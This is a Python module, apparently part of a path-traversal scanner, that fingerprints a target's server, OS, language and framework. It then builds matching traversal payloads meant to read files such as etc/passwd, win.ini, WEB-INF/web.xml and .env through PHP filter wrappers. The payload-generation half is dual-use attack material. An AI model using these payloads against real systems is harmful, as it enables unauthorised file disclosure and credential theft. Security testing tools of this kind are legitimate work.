"""Target fingerprinting — OS, server, framework, language detection.

Uses response headers, error-page content, and cookie names to infer
the remote stack and feed that context into payload selection.
"""

from __future__ import annotations

import re
from typing import Dict, List, Optional, Tuple

from pathprobe.core.types import Response, TargetInfo


class TargetFingerprinter:
    """Detect remote OS, web server, framework, and language."""

    def fingerprint(self, response: Response) -> TargetInfo:
        """Analyse a *baseline* response and return a ``TargetInfo``."""
        info = TargetInfo()
        headers = response.headers
        body = response.body
        status = response.status

        # ── Server header ────────────────────────────────────────────
        server = headers.get("Server", headers.get("server", "")).lower()
        if "apache" in server:
            info.server = "apache"
            if info.os is None:
                info.os = "linux"
        elif "nginx" in server:
            info.server = "nginx"
            if info.os is None:
                info.os = "linux"
        elif "iis" in server or "microsoft" in server:
            info.server = "iis"
            info.os = "windows"
        elif "tomcat" in server or "coyote" in server:
            info.server = "tomcat"
            info.language = "java"
        elif "jetty" in server:
            info.server = "jetty"
            info.language = "java"
        elif "gunicorn" in server or "uvicorn" in server:
            info.server = server.split("/")[0]
            info.language = "python"
            info.os = "linux"
        elif "kestrel" in server:
            info.server = "kestrel"
            info.language = "dotnet"

        # ── X-Powered-By ─────────────────────────────────────────────
        powered = headers.get("X-Powered-By",
                              headers.get("x-powered-by", "")).lower()
        if "php" in powered:
            info.language = "php"
        elif "asp.net" in powered:
            info.language = "dotnet"
            info.os = "windows"
        elif "express" in powered:
            info.language = "nodejs"
        elif "servlet" in powered or "jsp" in powered:
            info.language = "java"

        # ── Cookie-based hints ────────────────────────────────────────
        cookies = (headers.get("Set-Cookie", "") +
                   headers.get("set-cookie", ""))
        if "PHPSESSID" in cookies:
            info.language = "php"
        elif "JSESSIONID" in cookies:
            info.language = "java"
        elif "ASP.NET" in cookies or "aspnet" in cookies.lower():
            info.language = "dotnet"
            info.os = "windows"
        elif "connect.sid" in cookies or "express" in cookies.lower():
            info.language = "nodejs"
        elif "csrftoken" in cookies and "sessionid" in cookies:
            info.language = "python"
            info.framework = "django"

        # ── Body-based framework detection ───────────────────────────
        body_lower = body[:8192].lower()

        if "laravel" in body_lower or "symfony" in body_lower:
            info.framework = "laravel"
            info.language = "php"
        elif "django" in body_lower or "wsgi" in body_lower:
            info.framework = "django"
            info.language = "python"
        elif "flask" in body_lower:
            info.framework = "flask"
            info.language = "python"
        elif "spring" in body_lower or "java.lang" in body:
            info.framework = "spring"
            info.language = "java"
        elif "tomcat" in body_lower or "catalina" in body_lower:
            info.server = "tomcat"
            info.language = "java"
        elif "struts" in body_lower:
            info.framework = "struts"
            info.language = "java"
        elif "rails" in body_lower or "action_controller" in body_lower:
            info.framework = "rails"
            info.language = "ruby"
        elif "express" in body_lower and "node" in body_lower:
            info.framework = "express"
            info.language = "nodejs"
        elif "next.js" in body_lower or "__next" in body_lower:
            info.framework = "nextjs"
            info.language = "nodejs"
        elif "wordpress" in body_lower or "wp-content" in body_lower:
            info.framework = "wordpress"
            info.language = "php"
        elif "drupal" in body_lower:
            info.framework = "drupal"
            info.language = "php"
        elif "joomla" in body_lower:
            info.framework = "joomla"
            info.language = "php"

        # ── OS detection from path separators in body ────────────────
        if re.search(r"[A-Z]:\\", body):
            info.os = "windows"
        elif re.search(r"(/var/|/usr/|/home/|/etc/|/opt/|/tmp/)", body):
            info.os = "linux"

        # ── Build extra payloads based on detected stack ─────────────
        info.extra_payloads = self._extra_payloads(info)

        return info

    def _extra_payloads(
        self, info: TargetInfo,
    ) -> List[Tuple[str, Dict[str, str]]]:
        """Generate server/framework-specific payloads."""
        extras: List[Tuple[str, Dict[str, str]]] = []

        if info.server == "tomcat" or info.language == "java":
            # Tomcat semicolon path-parameter bypass
            for depth in (3, 5, 7):
                extras.append((
                    "..;/" * depth + "etc/passwd",
                    {"technique": "tomcat_semicolon", "os": "linux"},
                ))
                extras.append((
                    "..;/" * depth + "WEB-INF/web.xml",
                    {"technique": "tomcat_semicolon", "os": "any"},
                ))

        if info.server == "iis" or info.os == "windows":
            # IIS backslash normalization
            for depth in (3, 5):
                extras.append((
                    "..%5c" * depth + "windows%5cwin.ini",
                    {"technique": "iis_backslash", "os": "windows"},
                ))
            # IIS tilde shortname
            extras.append((
                "/~1/", {"technique": "iis_shortname", "os": "windows"},
            ))

        if info.language == "php":
            # PHP-specific wrappers and paths
            extras.extend([
                ("php://filter/convert.base64-encode/resource=../config",
                 {"technique": "php_wrapper"}),
                ("php://filter/convert.base64-encode/resource=../../.env",
                 {"technique": "php_wrapper"}),
                ("php://filter/convert.base64-encode/resource=index",
                 {"technique": "php_wrapper"}),
            ])

        if info.server == "nginx":
            # Nginx off-by-slash
            extras.append(("../", {"technique": "nginx_off_by_slash"}))

        if info.framework == "spring":
            extras.extend([
                ("..;/..;/..;/etc/passwd",
                 {"technique": "spring_semicolon", "os": "linux"}),
                ("..%252f..%252f..%252fetc/passwd",
                 {"technique": "spring_double_encode", "os": "linux"}),
            ])

        if info.language == "dotnet":
            extras.extend([
                ("....//....//....//windows/win.ini",
                 {"technique": "dotnet_nested", "os": "windows"}),
                ("..%u005c..%u005c..%u005cwindows%u005cwin.ini",
                 {"technique": "dotnet_unicode", "os": "windows"}),
            ])

        return extras

    def select_os_hint(self, info: TargetInfo) -> Optional[str]:
        """Return ``'linux'``, ``'windows'``, or ``None`` (test both)."""
        return info.os
